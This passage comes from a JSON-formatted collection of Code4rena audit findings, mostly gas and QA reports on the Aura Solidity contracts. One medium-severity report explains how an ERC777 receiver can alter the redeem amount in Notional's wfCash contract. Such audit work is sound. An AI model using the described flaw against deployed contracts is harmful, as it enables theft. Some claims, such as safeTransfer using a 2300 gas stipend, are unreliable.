Increments/Decrements can be unchecked\n\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.  \n  \n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nAffected code:  \n\n- Increment:\n\n```solidity\ncontracts/AuraClaimZap.sol:143:        for (uint256 i = 0; i < rewardContracts.length; i++) {\ncontracts/AuraClaimZap.sol:147:        for (uint256 i = 0; i < extraRewardContracts.length; i++) {\ncontracts/AuraClaimZap.sol:151:        for (uint256 i = 0; i < tokenRewardContracts.length; i++) {\ncontracts/AuraLocker.sol:174:            for (uint256 i = 0; i < rewardTokensLength; i++) {\ncontracts/AuraLocker.sol:306:        for (uint256 i; i < rewardTokensLength; i++) {\ncontracts/AuraLocker.sol:410:            for (uint256 i = nextUnlockIndex; i < length; i++) {\ncontracts/AuraLocker.sol:696:        for (uint256 i = nextUnlockIndex; i < locks.length; i++) {\ncontracts/AuraLocker.sol:773:        for (uint256 i = 0; i < userRewardsLength; i++) {\ncontracts/AuraVestedEscrow.sol:100:        for (uint256 i = 0; i < _recipient.length; i++) {\ncontracts/BalLiquidityProvider.sol:51:        for (uint256 i = 0; i < 2; i++) {\ncontracts/ExtraRewardsDistributor.sol:233:        for (uint256 i = epochIndex; i < tokenEpochs; i++) {\n```\n\n- Decrement:\n\n```solidity\ncontracts/AuraLocker.sol:\n  497:                 i--;\n  664:         for (uint256 i = locksLength; i > 0; i--) {\n  726:         for (uint256 i = epochIndex + 1; i > 0; i--) {\n```\n\nThe code would go from:  \n  \n```solidity\nfor (uint256 i; i < numIterations; i++) {  //or i--\n // ...  \n}  \n```\n\nto:  \n\n```solidity\nfor (uint256 i; i < numIterations;) {  \n // ...  \n unchecked { ++i; }  //or unchecked { --i; }\n}  \n```\n\nThe risk of overflow is inexistant for `uint256` here.\n\nPlease, notice that in `convex-platform/contracts/`, the syntax used is already unchecked, as the Solidity version used is 0.6.12, which doesn't implement a default overflow check. Only contracts under `contracts/` are concerned.\n\n## Use `calldata` instead of `memory`\n\nWhen arguments are read-only on external functions, the data location should be `calldata`:\n\n```solidity\nFile: PoolManagerSecondaryProxy.sol\n68:     function setUsedAddress(address[] memory usedList) external onlyOwner{ //@audit gas: should use calldata instead of memory\n69:         for(uint i=0; i < usedList.length; i++){\n70:             usedMap[usedList[i]] = true;\n71:         }\n72:     }\n```\n\n## No need to explicitly initialize variables with default values\n\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nAffected code:\n\n```solidity\ncontracts/AuraBalRewardPool.sol:35:    uint256 public pendingPenalty = 0;\ncontracts/AuraBalRewardPool.sol:38:    uint256 public periodFinish = 0;\ncontracts/AuraBalRewardPool.sol:39:    uint256 public rewardRate = 0;\ncontracts/AuraClaimZap.sol:143:        for (uint256 i = 0; i < rewardContracts.length; i++) {\ncontracts/AuraClaimZap.sol:147:        for (uint256 i = 0; i < extraRewardContracts.length; i++) {\ncontracts/AuraClaimZap.sol:151:        for (uint256 i = 0; i < tokenRewardContracts.length; i++) {\ncontracts/AuraLocker.sol:72:    uint256 public queuedCvxCrvRewards = 0;\ncontracts/AuraLocker.sol:114:    bool public isShutdown = false;\ncontracts/AuraLocker.sol:174:            for (uint256 i = 0; i < rewardTokensLength; i++) {\ncontracts/AuraLocker.sol:381:        uint256 reward = 0;\ncontracts/AuraLocker.sol:485:        uint256 futureUnlocksSum = 0;\ncontracts/AuraLocker.sol:540:                    uint256 unlocksSinceLatestCkpt = 0;\ncontracts/AuraLocker.sol:630:        uint256 low = 0;\ncontracts/AuraLocker.sol:773:        for (uint256 i = 0; i < userRewardsLength; i++) {\ncontracts/AuraMerkleDrop.sol:29:    uint256 public pendingPenalty = 0;\ncontracts/AuraVestedEscrow.sol:33:    bool public initialised = false;\ncontracts/AuraVestedEscrow.sol:99:        uint256 totalAmount = 0;\ncontracts/AuraVestedEscrow.sol:100:        for (uint256 i = 0; i < _recipient.length; i++) {\ncontracts/BalLiquidityProvider.sol:51:        for (uint256 i = 0; i < 2; i++) {\ncontracts/ExtraRewardsDistributor.sol:231:        uint256 claimableTokens = 0;\nconvex-platform/contracts/contracts/ArbitartorVault.sol:49:       for(uint256 i = 0; i < _toPids.length; i++){\nconvex-platform/contracts/contracts/BaseRewardPool.sol:71:    uint256 public periodFinish = 0;\nconvex-platform/contracts/contracts/BaseRewardPool.sol:72:    uint256 public rewardRate = 0;\nconvex-platform/contracts/contracts/BaseRewardPool.sol:75:    uint256 public queuedRewards = 0;\nconvex-platform/contracts/contracts/BaseRewardPool.sol:76:    uint256 public currentRewards = 0;\nconvex-platform/contracts/contracts/BaseRewardPool.sol:77:    uint256 public historicalRewards = 0;\nconvex-platform/contracts/contracts/Booster.sol:29:    uint256 public platformFee = 0; //possible fee to build treasury\nconvex-platform/contracts/contracts/Booster.sol:538:        for(uint256 i = 0; i < _gauge.length; i++){\nconvex-platform/contracts/contracts/BoosterOwner.sol:144:        for(uint256 i = 0; i < poolCount; i++){\nconvex-platform/contracts/contracts/ConvexMasterChef.sol:63:    uint256 public totalAllocPoint = 0;\nconvex-platform/contracts/contracts/ConvexMasterChef.sol:180:        for (uint256 pid = 0; pid < length; ++pid) {\nconvex-platform/contracts/contracts/CrvDepositor.sol:36:    uint256 public incentiveCrv = 0;\nconvex-platform/contracts/contracts/ExtraRewardStashV3.sol:125:        for(uint256 i = 0; i < maxRewards; i++){\nconvex-platform/contracts/contracts/VirtualBalanceRewardPool.sol:89:    uint256 public periodFinish = 0;\nconvex-platform/contracts/contracts/VirtualBalanceRewardPool.sol:90:    uint256 public rewardRate = 0;\nconvex-platform/contracts/contracts/VirtualBalanceRewardPool.sol:93:    uint256 public queuedRewards = 0;\nconvex-platform/contracts/contracts/VirtualBalanceRewardPool.sol:94:    uint256 public currentRewards = 0;\nconvex-platform/contracts/contracts/VirtualBalanceRewardPool.sol:95:    uint256 public historicalRewards = 0;\nconvex-platform/contracts/contracts/VoterProxy.sol:308:        uint256 _balance = 0;\n```\n\nI suggest removing explicit initializations for default values.\n\n## Upgrade pragma to at least 0.8.4\n\nUsing newer compiler versions and the optimizer give gas optimizations. Also, additional safety checks are available for free.\n\nThe advantages here are:\n\n- **Low level inliner** (>= 0.8.2): Cheaper runtime gas (especially relevant when the contract has small functions).\n- **Optimizer improvements in packed structs** (>= 0.8.3)\n- **Custom errors** (>= 0.8.4): cheaper deployment cost and runtime cost. *Note*: the runtime cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.\n\nConsider upgrading pragma to at least 0.8.4 for contracts in `convex-platform/contracts` (ideally 0.8.11 for consistency), as they use Solidity 0.6.12.\n\n## Reduce the size of error messages (Long revert Strings)\n\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\nRevert strings > 32 bytes:\n\n```solidity\ncontracts/AuraLocker.sol:197:        require(_rewardsToken != address(stakingToken), \"Cannot add StakingToken as reward\"); //@audit-issue : length == 33\n```\n\nI suggest shortening the revert strings to fit in 32 bytes.\n\n## Use Custom Errors instead of Revert Strings to save Gas\n\nSolidity 0.8.4 introduced custom errors. They are more gas efficient than revert strings, when it comes to deploy cost as well as runtime cost when the revert condition is met. Use custom errors instead of revert strings for gas savings.\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nI suggest replacing all revert strings with custom errors in `/contracts`.\n",
    "dataSource": {
      "name": "code-423n4/2022-05-aura-findings",
      "repo": "https://github.com/code-423n4/2022-05-aura-findings",
      "url": "https://github.com/code-423n4/2022-05-aura-findings/issues/336"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## G01 - Comparison ```> 0``` is less gas efficient than ```!= 0``` with ```uint256``` in ```require``` statement\n\n```solidity\ncontracts/Aura.sol:68   require(_amount > 0, \"Must mint something\");\ncontracts/AuraBalRewardPool.sol:121    require(_amount > 0, \"RewardPool : Cannot stake 0\");\ncontracts/AuraBalRewardPool.sol:139    require(_amount > 0, \"RewardPool : Cannot stake 0\");\ncontracts/AuraBalRewardPool.sol:157    require(amount > 0, \"RewardPool : Cannot withdraw 0\");\ncontracts/AuraBalRewardPool.sol:210    require(rewardsAvailable > 0, \"!balance\");\ncontracts/AuraLocker.sol:210    require(rewardData[_rewardsToken].lastUpdateTime > 0, \"Reward does not exist\");\ncontracts/AuraLocker.sol:259    require(_amount > 0, \"Cannot stake 0\");\ncontracts/AuraLocker.sol:359    require(amt > 0, \"Nothing locked\");\ncontracts/AuraLocker.sol:385    require(length > 0, \"no locks\");\ncontracts/AuraLocker.sol:431    require(locked > 0, \"no exp locks\");\ncontracts/AuraLocker.sol:471    require(len > 0, \"Nothing to delegate\");\ncontracts/AuraLocker.sol:822    require(_rewards > 0, \"No reward\");\ncontracts/AuraLocker.sol:851    require(_reward > 0, \"No reward\");\ncontracts/AuraMerkleDrop.sol:122    require(_amount > 0, \"!amount\");\ncontracts/AuraPenaltyForwarder.sol:52   require(bal > 0, \"!empty\");\ncontracts/AuraVestedEscrow.sol:118  require(totalLocked[_recipient] > 0, \"!funding\");\ncontracts/BalLiquidityProvider.sol:57   require(bal > 0 && bal == _request.maxAmountsIn[i], \"!bal\");\ncontracts/BalLiquidityProvider.sol:70   require(balAfter > 0, \"!mint\");\ncontracts/ExtraRewardsDistributor.sol:171   require(_index > 0 && _index < rewardEpochs[_token].length - 1, \"!past\");\nconvex-platform/contracts/contracts/BaseRewardPool.sol:211  require(_amount > 0, 'RewardPool : Cannot stake 0');\nconvex-platform/contracts/contracts/BaseRewardPool.sol:227  require(amount > 0, 'RewardPool : Cannot withdraw 0');\nconvex-platform/contracts/contracts/CrvDepositor.sol:169    require(_amount > 0,\"!>0\");  \nconvex-platform/contracts/contracts/PoolManagerSecondaryProxy.sol:104   require(weight > 0, \"must have weight\");\n```\n\n## G02 - No need to initialize variables with default values\n\nIf a variable is not set, it is assumed to have the default value (0, false etc). \n\n```solidity\ncontracts/AuraBalRewardPool.sol:35  uint256 public pendingPenalty = 0;\ncontracts/AuraBalRewardPool.sol:38  uint256 public periodFinish = 0;\ncontracts/AuraBalRewardPool.sol:39  uint256 public rewardRate = 0;\ncontracts/AuraLocker.sol:72    uint256 public queuedCvxCrvRewards = 0;\ncontracts/AuraLocker.sol:114    bool public isShutdown = false;\ncontracts/AuraMerkleDrop.sol:29   uint256 public pendingPenalty = 0;\ncontracts/AuraVestedEscrow.sol:33   bool public initialised = false;\nconvex-platform/contracts/contracts/BaseRewardPool.sol:71   uint256 public periodFinish = 0;\nconvex-platform/contracts/contracts/BaseRewardPool.sol:72   uint256 public rewardRate = 0;\nconvex-platform/contracts/contracts/BaseRewardPool.sol:75   uint256 public queuedRewards = 0;\nconvex-platform/contracts/contracts/BaseRewardPool.sol:76   uint256 public currentRewards = 0;\nconvex-platform/contracts/contracts/BaseRewardPool.sol:77   uint256 public historicalRewards = 0;\nconvex-platform/contracts/contracts/Booster.sol:29  uint256 public platformFee = 0; //possible fee to build treasury\nconvex-platform/contracts/contracts/CrvDepositor.sol:36 uint256 public incentiveCrv = 0;  \nconvex-platform/contracts/contracts/VirtualBalanceRewardPool.sol:89    uint256 public periodFinish = 0;\nconvex-platform/contracts/contracts/VirtualBalanceRewardPool.sol:90    uint256 public rewardRate = 0;\nconvex-platform/contracts/contracts/VirtualBalanceRewardPool.sol:93    uint256 public queuedRewards = 0;\nconvex-platform/contracts/contracts/VirtualBalanceRewardPool.sol:94    uint256 public currentRewards = 0;\nconvex-platform/contracts/contracts/VirtualBalanceRewardPool.sol:95    uint256 public historicalRewards = 0;\n```\n\n## G03 - Variables that can be changed to ```immutable```\n\n```solidity\ncontracts/AuraLocker.sol:117    string private _name;\ncontracts/AuraLocker.sol:118    string private _symbol;\ncontracts/ClaimFeesHelper.sol:23    IFeeDistributor public feeDistro;\nconvex-platform/contracts/contracts/BaseRewardPool4626.sol:26   address public override asset;\nconvex-platform/contracts/contracts/DepositToken.sol:22   address public operator;  \nconvex-platform/contracts/contracts/TokenFactory.sol:21   string public namePostfix;  \nconvex-platform/contracts/contracts/TokenFactory.sol:22   string public symbolPrefix;\n```\n\n## G04 - Cache array length before ```for``` loop\n\nOptimizing ```for``` loops by caching memory array length before loop, instead of calling it every time.\n\n```solidity\ncontracts/AuraClaimZap.sol:143    for (uint256 i = 0; i < rewardContracts.length; i++) {\ncontracts/AuraClaimZap.sol:147    for (uint256 i = 0; i < extraRewardContracts.length; i++) {\ncontracts/AuraClaimZap.sol:151    for (uint256 i = 0; i < tokenRewardContracts.length; i++) {\ncontracts/AuraLocker.sol:696    for (uint256 i = nextUnlockIndex; i < locks.length; i++) {\ncontracts/AuraVestedEscrow.sol:100    for (uint256 i = 0; i < _recipient.length; i++) {\nconvex-platform/contracts/contracts/ArbitartorVault.sol:49   for(uint256 i = 0; i < _toPids.length; i++){\nconvex-platform/contracts/contracts/BaseRewardPool.sol:214  for(uint i=0; i < extraRewards.length; i++){  \nconvex-platform/contracts/contracts/BaseRewardPool.sol:230  for(uint i=0; i < extraRewards.length; i++){  \nconvex-platform/contracts/contracts/BaseRewardPool.sol:262  for(uint i=0; i < extraRewards.length; i++){\nconvex-platform/contracts/contracts/BaseRewardPool.sol:296  for(uint i=0; i < extraRewards.length; i++){  \nconvex-platform/contracts/contracts/Booster.sol:379    for(uint i=0; i < poolInfo.length; i++){\nconvex-platform/contracts/contracts/Booster.sol:538   for(uint256 i = 0; i < _gauge.length; i++){\nconvex-platform/contracts/contracts/PoolManagerSecondaryProxy.sol:69    for(uint i=0; i < usedList.length; i++){  \n```\n\n## G05 - Using ++i consumes less gas than i++\n\n```solidity\ncontracts/AuraClaimZap.sol:143    for (uint256 i = 0; i < rewardContracts.length; i++) {\ncontracts/AuraClaimZap.sol:147    for (uint256 i = 0; i < extraRewardContracts.length; i++) {\ncontracts/AuraClaimZap.sol:151    for (uint256 i = 0; i < tokenRewardContracts.length; i++) {\ncontracts/AuraLocker.sol:696    for (uint256 i = nextUnlockIndex; i < locks.length; i++) {\ncontracts/AuraVestedEscrow.sol:100    for (uint256 i = 0; i < _recipient.length; i++) {\ncontracts/AuraLocker.sol:174    for (uint256 i = 0; i < rewardTokensLength; i++) {\ncontracts/AuraLocker.sol:306    for (uint256 i; i < rewardTokensLength; i++) {\ncontracts/AuraLocker.sol:410    for (uint256 i = nextUnlockIndex; i < length; i++) {\ncontracts/AuraLocker.sol:664    for (uint256 i = locksLength; i > 0; i--) {\ncontracts/AuraLocker.sol:726    for (uint256 i = epochIndex + 1; i > 0; i--) {\ncontracts/AuraLocker.sol:773    for (uint256 i = 0; i < userRewardsLength; i++) {\ncontracts/ExtraRewardsDistributor.sol:233   for (uint256 i = epochIndex; i < tokenEpochs; i++) {\n```\n\n## G06 - ```unchecked``` block can be used for gas efficiency of the expression that can't overflow/underflow\n\nCheck comments\n\n```solidity\ncontracts/AuraBalRewardPool.sol:185    rewardToken.safeTransfer(msg.sender, reward - penalty); // penalty <= reward due to L183\ncontracts/AuraLocker.sol:278    if (idx == 0 || userLocks[_account][idx - 1].unlockTime < unlockTime) { // If idx == 0 then first part return true, so here and on L281 can't be underflow\ncontracts/AuraLocker.sol:334    while (epochs[epochs.length - 1].date != currentEpoch) {  //  If epochs.length == 0 then it will be checked on L332, so here and on L335 can't be underflow\ncontracts/AuraLocker.sol:402    uint256 epochsover = currentEpoch.sub(uint256(locks[length - 1].unlockTime)).div(rewardsDuration); // length > 0, checked on L385, so here and on L404 can't be underflow\ncontracts/AuraLocker.sol:484    uint256 i = len - 1; // len > 0, checked on L471\ncontracts/AuraLocker.sol:497    i--; // i > 0, checked on L496\ncontracts/AuraLocker.sol:521    DelegateeCheckpoint memory prevCkpt = ckpts[ckpts.length - 1]; // ckpts.length > 0, checked on L520, so here and on L524 can't be underflow\ncontracts/AuraLocker.sol:640    return high == 0 ? DelegateeCheckpoint(0, 0) : ckpts[high - 1]; // can't be underflow due to statement logic\ncontracts/AuraLocker.sol:665    uint256 lockEpoch = uint256(locks[i - 1].unlockTime).sub(lockDuration); // i > 0, checked on L664, so here and on 670 can't be underflow\ncontracts/AuraLocker.sol:699    lockData = new LockedBalance[](locks.length - i); // i < locks.length due to L696\ncontracts/AuraLocker.sol:722    uint256 lastIndex = epochs.length - 1; // epochs.length > 0 due to L718\ncontracts/AuraLocker.sol:727    Epoch memory e = epochs[i - 1]; // i > 0 due to L726\ncontracts/AuraMerkleDrop.sol:138    aura.safeTransfer(msg.sender, _amount - penalty); // penalty < _amount due to L136\ncontracts/AuraVestedEscrow.sol:162  uint256 elapsed = _time - startTime;  // startTime < _time due to L158\ncontracts/ExtraRewardsDistributor.sol:74    require(len == 0 || rewardEpochs[_token][len - 1] < _epoch, \"Cannot backdate to this epoch\"); // if len == 0 then first part return true\ncontracts/ExtraRewardsDistributor.sol:102   if (len == 0 || rewardEpochs[_token][len - 1] < _epoch) { if len == 0 then first part return true\n```\n\n## G07 - Too long revert strings\n\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition has been met.\n\n```solidity\ncontracts/AuraLocker.sol:197    require(_rewardsToken != address(stakingToken), \"Cannot add StakingToken as reward\");\n```\n\n## G08 - Named return vatiable\n\nRemoving unused named return variables can reduce gas usage and improve code clarity.\n\n```solidity\ncontracts/AuraLocker.sol:712    function totalSupply() external view returns (uint256 supply) {\ncontracts/AuraLocker.sol:739    function findEpochId(uint256 _time) public view returns (uint256 epoch) {\nconvex-platform/contracts/contracts/BaseRewardPool4626.sol:179  function previewWithdraw(uint256 assets) public view virtual override returns(uint256 shares){  \n```\n\n## G09 - No needed ```+=```\n\nNo need to use ```+=``` instead of ```=```, since ```totalLocked[_recipient[i]]``` always be ```0``` here:\n\n```solidity\ncontracts/AuraVestedEscrow.sol:103  totalLocked[_recipient[i]] += amount;\n```\n\n## G10 - Caching storage values in memory\n\nVariables that are read multiple times in a code block can be cached and re-used instead of reading from storage to save gas.\n\n```solidity\ncontracts/AuraLocker.sol:812    .div(lockedSupply) // lockedSupply 2 SLOAD\ncontracts/AuraMerkleDrop.sol:126    require(MerkleProof.verify(_proof, merkleRoot, leaf), \"invalid proof\"); // merkleRoot 2 SLOAD\ncontracts/AuraMerkleDrop.sol:132    aura.safeApprove(address(auraLocker), _amount); // auraLocker 2 SLOAD\ncontracts/AuraStakingProxy.sol:119  owner = pendingOwner; // pendingOwner 2 SLOAD\ncontracts/AuraStakingProxy.sol:148  IERC20(crv).safeApprove(crvDepositorWrapper, type(uint256).max); // crvDepositorWrapper 2 SLOAD\ncontracts/AuraStakingProxy.sol:151  IERC20(cvxCrv).safeApprove(rewards, type(uint256).max); // rewards 2 SLOAD\ncontracts/AuraStakingProxy.sol:172  require(msg.sender == keeper, \"!auth\"); // keeper 2 SLOAD\ncontracts/AuraStakingProxy.sol:179  ICrvDepositor(crvDepositorWrapper).deposit(crvBal, minOut, true, address(0)); // crvDepositorWrapper 2 SLOAD\ncontracts/AuraStakingProxy.sol:219  IAuraLocker(rewards).notifyRewardAmount(address(_token), bal); // rewards 3 SLOAD\ncontracts/AuraVestedEscrow.sol:186  rewardToken.safeApprove(address(auraLocker), claimable); // auraLocker 2 SLOAD\nconvex-platform/contracts/contracts/Booster.sol:235    emit FeeInfoUpdated(_feeDistro, lockRewards, crv); // lockRewards 3 SLOAD\nconvex-platform/contracts/contracts/Booster.sol:606   IERC20(crv).safeTransfer(treasury, _platform); // treasury 3 SLOAD\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-aura-findings",
      "repo": "https://github.com/code-423n4/2022-05-aura-findings",
      "url": "https://github.com/code-423n4/2022-05-aura-findings/issues/327"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "2022-05-aura gas optimization\n\n## 1 Delete unused import statements. The following lines can be deleted because they will be never used in the AuraToken. You can save deployment costs by deleting.\n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/Aura.sol#L4\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/Aura.sol#L6\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/Aura.sol#L7\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/Aura.sol#L21\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/Aura.sol#L22\n\nDelete them.\n\n## 2 use the initial value for uint256 in the following lines.\n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L35\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L38\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L39\n \n## 3  missing validation for newOperator in updateOperator.\nAs the comment describes, this can be called if the operator of the voterProxy somehow changes. To avoid unnecessary state updates, you can add validation for the newOperator.\n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/Aura.sol#L82-L86\n\nrequire(newOperator != operator, “Operator not changed”);\n\n##4 use initial value for uint256. \n\nThe initial value of uint256 is 0, so you can save gas costs without setting the default value for uint256.\n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L35\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L38\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L39\n\n## 4 use initial value for bool. \n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraVestedEscrow.sol#L33\n\nbool public initialised;\n\n## 5 use cache for startTime in _totalVestedOf. \nThe startTime will be called twice in this function. You can save gas costs by using cache.\n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraVestedEscrow.sol#L158\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraVestedEscrow.sol#L162\n\nUint256 _startTime = startTime;\n\nif (_time < _startTime) {} for the line 158.\nuint256 elapsed = _time - _startTime; for the line 162.\n\n## 6 code duplication.\nThe following lines have the same function and are used three times in the contract. You can save deployment costs if you use a modifier.\n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraVestedEscrow.sol#L78\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraVestedEscrow.sol#L87\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraVestedEscrow.sol#L117\n\nmodifier onlyOwner {\n    require(msg.sender == admin, \"!auth\");\n    _;\n}\n\n## 7 use cache for auraLocker in _claim. \nauraLocker will be used three times in the if sentence. Save gas by using a cache.\n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraVestedEscrow.sol#L185-L187\n\nif (_lock) {\n    IAuraLocker _auraLocker = auraLocker;\n    require(address(_auraLocker) != address(0), \"!auraLocker\");\n    rewardToken.safeApprove(address(_auraLocker), claimable);\n    auraLocker.lock(_recipient, claimable);\n} else {\n\n\n## 8 delete unused state variable. The state variable endTime will be never used outside of the constructor, so it can be deleted.\n\n https://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraVestedEscrow.sol#L64\n\nDelete it.\n\n## 9 use cache for voterProxy in claimFees.\nvoterProxy is used four times in clainFees. With cache, you can save gas costs.\n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/ClaimFeesHelper.sol#L47-L52\n\naddress _voterProxy = voterProxy;\n\nuint256 bal = IERC20(_token).balanceOf(_voterProxy);\nfeeDistro.claimToken(_voterProxy, _token);\nwhile (IERC20(_token).balanceOf(_voterProxy) <= bal) {\n    feeDistro.claimToken(_voterProxy, _token);\n}\n\n## 10 code duplication. The following lines are the same. You create a new modifier and can save deployment costs.\n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraStakingProxy.sol#L89\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraStakingProxy.sol#L100\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraStakingProxy.sol#L108\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraStakingProxy.sol#L116\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraStakingProxy.sol#L128\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraStakingProxy.sol#L138\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraStakingProxy.sol#L158\n\nmodifier onlyOwner {\n    require(msg.sender == owner, \"!auth\");\n    _;\n}\n",
    "dataSource": {
      "name": "code-423n4/2022-05-aura-findings",
      "repo": "https://github.com/code-423n4/2022-05-aura-findings",
      "url": "https://github.com/code-423n4/2022-05-aura-findings/issues/325"
    }
  },
  {
    "title": "QA Report",
    "body": "## QA (LOW & NON-CRITICAL)\n\n* Floating Pragma used in `Aura.sol`, `AuraBalRewardPool.sol`, `AuraClaimZap.sol`, `AuraMath.sol`, `AuraMerkleDrop.sol`, `AuraMinter.sol`, `AuraPenaltyForwarder.sol`, `AuraStakingProxy.sol`, `AuraVestedEscrow.sol`, `BalLiquidityProvider.sol`, `ClaimFeesHelper.sol`, `ExtraRewardsDistributor.sol`.  Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma (i.e. by not using ^)  helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n[Reference](https://swcregistry.io/docs/SWC-103)\n\n* The whole project have different solidity compiler ranges ( 0.6.12 - 0.8.11) referenced. This leads to potential security flaws between deployed contracts depending on the compiler version chosen for any particular file. It also greatly increases the cost of maintenance as different compiler versions have different semantics and behavior.\n\n* The project uses Solidity version 0.6.12. Using an old version prevents access to new Solidity security checks. However the current version is 0.8.14 with more benefits and less bugs.\n\n* The project uses deprecated `safeApprove` in AuraBalRewardPool.sol, AuraClaimZap.sol, AuraLocker.sol, AuraMerkleDrop.sol, AuraPenaltyForwarder.sol, AuraStakingProxy.sol, AuraVestedEscrow.sol, BalLiquidityProvider.sol, CrvDepositorWrapper.sol, BaseRewardPool4626.sol, Booster.sol, CrvDepositor.sol, VoterProxy.sol [Link](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#SafeERC20-safeApprove-contract-IERC20-address-uint256-)\n\n* `transfer` and `safeTransfer` methods are used inside the codebase. Since these methods use 2300 gas stipend which is not adjustable, it may likely to get broken when calling a contract's fallback function. \n[Reference Link -1](https://swcregistry.io/docs/SWC-134), [Reference Link -2](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/)\n\n* The `distributeOther()` function can be re-entered by fake tokens or tokens with callbacks. [Reference](https://github.com/code-423n4/2021-09-bvecvx/blob/1d64bd58c7a4224cc330cef283561e90ae6a3cf5/veCVX/contracts/locker/CvxStakingProxy.sol#L153)\n",
    "dataSource": {
      "name": "code-423n4/2022-05-aura-findings",
      "repo": "https://github.com/code-423n4/2022-05-aura-findings",
      "url": "https://github.com/code-423n4/2022-05-aura-findings/issues/310"
    }
  },
  {
    "title": "User can alter amount returned by redeem function due to control transfer",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L212-L222\n\n\n# Vulnerability details\n\n## Impact\nControl is transferred to the receiver when receiving the ERC777. They are able to transfer the ERC777 to another account, at which time the before and after balance calculation will be incorrect.\n\n```\n        uint256 balanceBefore = IERC20(asset()).balanceOf(receiver);\n\n\n        if (msg.sender != owner) {\n            _spendAllowance(owner, msg.sender, shares);\n        }\n        _redeemInternal(shares, receiver, owner);\n/////////////\nControl is transferred to user. They can alter their balance here.\n///////////\n\n        uint256 balanceAfter = IERC20(asset()).balanceOf(receiver);\n        uint256 assets = balanceAfter - balanceBefore;\n\n//////////\nAssets can be as low as 0 if they have transferred the same amount out as received.\n//////////\n\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n        return assets;\n```\n\n## Tools Used\nManual review\n\n",
    "dataSource": {
      "name": "code-423n4/2022-06-notional-coop-findings",
      "repo": "https://github.com/code-423n4/2022-06-notional-coop-findings",
      "url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/235"
    }
  },
  {
    "title": "QA Report",
